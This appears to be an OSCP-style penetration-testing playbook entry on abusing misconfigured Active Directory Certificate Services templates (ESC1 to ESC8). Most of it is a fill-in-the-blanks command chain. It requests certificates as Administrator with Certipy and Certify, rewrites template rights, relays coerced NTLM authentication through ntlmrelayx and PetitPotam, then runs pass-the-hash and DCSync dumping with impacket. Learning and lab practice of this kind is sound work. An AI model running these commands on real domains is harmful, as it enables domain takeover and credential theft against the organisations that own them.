title: AD CS — Misconfigured Certificate Templates (ESC1-ESC8)
body:
Active Directory Certificate Services (AD CS) misconfigurations let low-privilege users enroll for certificates that authenticate as Domain Admin. Increasingly common on OSCP PG labs. Certipy from Kali is the primary tool — it finds and exploits in one workflow.

The four most common misconfigurations:

ESC1 — certificate template allows requesters to specify an arbitrary Subject Alternative Name (SAN). Any user can request a certificate saying they are Administrator. Requires: Client Authentication EKU + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag + low-privilege enrollment rights.

ESC2 — template grants 'Any Purpose' or no EKU. More obscure but same impact.

ESC3 — template grants Certificate Request Agent EKU, letting you enroll on behalf of other users.

ESC4 — you have write rights on a template (WriteDacl/WriteOwner/GenericAll). Modify the template to add ESC1 conditions, exploit, then restore.

ESC8 — AD CS web enrollment endpoint (HTTP) is vulnerable to NTLM relay. Coerce DC authentication → relay to CA → get DC certificate → DCSync.

The workflow is always: find → identify ESC type → request cert → authenticate with cert → PTH or DCSync.
cmd:
# ══════════════════════════════════════════════════
# ENUMERATE — FIND VULNERABLE TEMPLATES
# ══════════════════════════════════════════════════
# From Kali (no shell on target needed — just creds):
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip>
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout
# -vulnerable flag filters to only show exploitable templates
# Output: <domain>.json and <domain>.txt

# Or from Windows shell:
.\Certify.exe find /vulnerable
.\Certify.exe find /vulnerable /currentuser

# ══════════════════════════════════════════════════
# ESC1 — ARBITRARY SAN (most common)
# ══════════════════════════════════════════════════
# Certipy will show: 'ESC1' in vulnerable output
# Note: Template name, CA name

# Request cert as Administrator:
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA-Name>' -template '<Template-Name>' -upn 'administrator@<domain>' -dc-ip <dc-ip>
# Output: administrator.pfx

# Authenticate with the cert → get NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
# Output: administrator NTLM hash

# Pass-the-hash:
netexec smb <dc-ip> -u administrator -H <ntlm> -d <domain>
evil-winrm -i <dc-ip> -u administrator -H <ntlm>
impacket-psexec <domain>/administrator@<dc-ip> -hashes :<ntlm>

# ══════════════════════════════════════════════════
# ESC4 — WRITE RIGHTS ON TEMPLATE
# ══════════════════════════════════════════════════
# You have GenericWrite/WriteDACL on a certificate template
# Certipy can modify it to be ESC1-vulnerable, exploit, then restore:

# Save original template config:
certipy template -u '<user>@<domain>' -p '<pass>' -template '<Template-Name>' -save-old
# Modify to add ESC1 conditions:
certipy template -u '<user>@<domain>' -p '<pass>' -template '<Template-Name>' -configuration '<Template-Name>.json'
# Now exploit as ESC1:
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA-Name>' -template '<Template-Name>' -upn 'administrator@<domain>'
certipy auth -pfx administrator.pfx -dc-ip <dc-ip>
# Restore original template:
certipy template -u '<user>@<domain>' -p '<pass>' -template '<Template-Name>' -configuration '<Template-Name>.old.json'

# ══════════════════════════════════════════════════
# ESC8 — NTLM RELAY TO AD CS HTTP ENROLLMENT
# ══════════════════════════════════════════════════
# Check if HTTP enrollment is enabled:
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -stdout | grep -i 'web'
# Or: http://<ca-server>/certsrv — if it responds, ESC8 may work

# Step 1 — Start relay:
ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2 — Coerce DC authentication:
python3 PetitPotam.py -u '<user>' -p '<pass>' <your-kali-ip> <dc-ip>
# Or: impacket-printerbug <domain>/<user>:'<pass>'@<dc-ip> <your-kali-ip>

# Step 3 — Relay gets DC certificate (dc.pfx)
certipy auth -pfx dc.pfx -dc-ip <dc-ip>
# Gets DC$ NTLM hash → DCSync:
impacket-secretsdump <domain>/'DC$'@<dc-ip> -hashes :<dc-ntlm>

# ══════════════════════════════════════════════════
# TROUBLESHOOTING
# ══════════════════════════════════════════════════
# certipy auth fails with KDC error:
# Fix clock skew: sudo ntpdate <dc-ip>
# Add domain to /etc/hosts if DNS resolution fails

# 'Certificate template not found':
# Use the exact CA name and template name from certipy find output

# LDAPS required:
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <dc-ip> -scheme ldaps

# From Windows (Certify + Rubeus):
.\Certify.exe request /ca:<ca-server>\<ca-name> /template:<template> /altname:administrator
# Convert cert.pem to pfx: openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt
warn: The most common failure: clock skew. Kerberos requires clocks within 5 minutes of the DC. Fix with: sudo ntpdate <dc-ip> or sudo timedatectl set-ntp false && sudo date -s "$(curl -sI <dc-ip> | grep -i date | cut -d' ' -f2-)". The second most common: using the wrong CA name or template name — copy exactly from certipy find output, including spaces.

choices.label: Got admin NTLM hash via cert → PTH to DC
ESC8 relay → got DC hash → DCSync
No vulnerable templates — other AD paths
